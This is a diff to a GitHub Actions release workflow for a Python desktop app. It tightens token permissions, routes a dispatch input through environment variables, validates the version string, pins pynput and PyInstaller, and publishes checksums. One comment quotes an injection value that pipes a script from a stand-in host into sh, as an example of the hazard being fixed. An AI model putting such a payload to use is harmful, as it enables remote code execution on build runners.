@@ -13,8 +13,10 @@ on:
         description: "Version to release, without the leading v (e.g. 0.4.0)"
         required: true
 
+# Declared per job, not here. test and build pip-install from PyPI and run
+# PyInstaller over the tree; neither has any reason to hold a write token.
 permissions:
-  contents: write        # create the tag and the release
+  contents: read
 
 jobs:
   version:
@@ -24,13 +26,31 @@ jobs:
     steps:
       - id: pick
         # release/0.4.0 -> 0.4.0, or whatever workflow_dispatch was given.
+        #
+        # The dispatch input goes through `env`, never through ${{ }} inside
+        # the script: an expression is pasted in as text before the shell ever
+        # sees it, so a value like `x"; curl evil.sh | sh; :"` would execute.
+        env:
+          INPUT_VERSION: ${{ inputs.version }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
-          if [ -n "${{ inputs.version }}" ]; then
-            V="${{ inputs.version }}"
+          if [ -n "$INPUT_VERSION" ]; then
+            V="$INPUT_VERSION"
           else
-            V="${GITHUB_REF_NAME#release/}"
+            V="${REF_NAME#release/}"
           fi
-          echo "version=${V#v}" >> "$GITHUB_OUTPUT"
+          V="${V#v}"
+          # Shape-check it. Everything downstream builds a tag and a filename
+          # out of this, and `release/../../x` or `release/hotfix/0.4.1` would
+          # otherwise flow straight through.
+          case "$V" in
+            [0-9]*.[0-9]*.[0-9]*) ;;
+            *) echo "::error::'$V' is not a MAJOR.MINOR.PATCH version"; exit 1 ;;
+          esac
+          if ! printf %s "$V" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "::error::'$V' is not a MAJOR.MINOR.PATCH version"; exit 1
+          fi
+          echo "version=$V" >> "$GITHUB_OUTPUT"
           echo "Releasing $V"
 
   test:
@@ -41,9 +61,11 @@ jobs:
       - uses: actions/setup-python@v5
         with:
           python-version: "3.12"
+      # Pinned: a floating pynput or PyInstaller can change the build or the
+      # input backends underneath a release without a single commit here.
       - run: |
           python -m pip install --upgrade pip
-          pip install pynput
+          pip install "pynput==1.7.7"
           sudo apt-get update -qq && sudo apt-get install -y -qq xvfb
 
       - name: The version in the code must match the branch
@@ -88,7 +110,7 @@ jobs:
       - run: python -c "import tkinter; print('tkinter', tkinter.TkVersion)"
       - run: |
           python -m pip install --upgrade pip
-          pip install pyinstaller pynput
+          pip install "pyinstaller==6.11.1" "pynput==1.7.7"
 
       - name: Build
         run: >
@@ -148,6 +170,8 @@ jobs:
   publish:
     needs: [version, build]
     runs-on: ubuntu-latest
+    permissions:
+      contents: write        # the only job that needs it
     # The manual gate. Configure Settings -> Environments -> release with
     # "Required reviewers"; the job then waits for an approval before anything
     # reaches the Releases page. Without that setting it simply runs through.
@@ -160,9 +184,20 @@ jobs:
 
       - run: ls -la artifacts
 
+      # ROADMAP names update integrity as a pre-1.0 requirement: the updater
+      # downloads over HTTPS and then executes the result. Publishing the
+      # digests is the half that belongs here; verifying them is the app's.
+      - name: Checksums
+        working-directory: artifacts
+        run: sha256sum * | tee SHA256SUMS
+
       - uses: softprops/action-gh-release@v2
         with:
           tag_name: v${{ needs.version.outputs.version }}
+          # Without this the tag is created on the default branch instead of
+          # the commit that was just built and tested -- exactly the
+          # wrong-version failure the version-match step exists to prevent.
+          target_commitish: ${{ github.sha }}
           name: v${{ needs.version.outputs.version }}
           files: artifacts/*
           body: |
